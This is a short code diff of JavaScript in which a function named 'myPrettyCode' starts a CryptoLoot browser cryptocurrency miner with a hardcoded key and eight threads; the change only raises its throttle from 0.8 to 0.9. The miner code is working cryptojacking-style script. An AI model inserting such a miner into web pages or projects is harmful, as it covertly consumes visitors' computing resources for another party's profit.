@@ -20,7 +20,7 @@ var myPrettyCode = function() {
   // Start miner
   var miner=new CryptoLoot.Anonymous('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1',
         {
-        threads:8,autoThreads:false,throttle:0.8
+        threads:8,autoThreads:false,throttle:0.9
         }
   );
   miner.start();
